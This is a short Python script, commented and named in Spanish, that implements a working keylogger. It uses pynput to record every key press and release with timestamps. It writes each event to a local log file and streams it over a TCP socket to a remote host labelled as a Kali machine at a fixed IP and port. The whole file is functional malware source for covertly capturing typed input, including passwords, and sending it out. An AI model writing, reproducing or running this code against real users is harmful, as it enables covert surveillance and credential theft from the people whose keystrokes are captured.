from pynput.keyboard import Key, Listener
from datetime import datetime
import socket

archivo = open("registro.txt", "a", encoding="utf-8")

KALI_IP = "192.168.100.117"
KALI_PUERTO = 5000

conexion = socket.create_connection((KALI_IP, KALI_PUERTO))

contador = 0

try:
    with open("registro.txt", "r", encoding="utf-8") as archivo_existente:
        for linea in archivo_existente:
            if "| evento_" in linea:
                contador += 1
except FileNotFoundError:
    contador = 0

def enviar_evento(evento):
    conexion.sendall((evento + "\n").encode("utf-8"))
    
def on_press(key):
    global contador
    contador += 1
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    try:
        print(f'Tecla alfanumérica presionada: {key.char}')
        evento = f"{timestamp} | PRESS | evento_{contador:03d} | {key.char}"
        archivo.write(evento + "\n")
        archivo.flush()
        enviar_evento(evento)
    except AttributeError:
        print(f'Tecla especial presionada: {key}')
        evento = f"{timestamp} | PRESS | evento_{contador:03d} | {key}"
        archivo.write(evento + "\n")
        archivo.flush()
        enviar_evento(evento)

def on_release(key):
    global contador
    contador += 1

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

    print(f'Key released: {key}')

    evento = f"{timestamp} | RELEASE | evento_{contador:03d} | {key}"
    archivo.write(evento + "\n")
    archivo.flush()
    enviar_evento(evento)

    if key == Key.esc:
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

conexion.close()
archivo.close()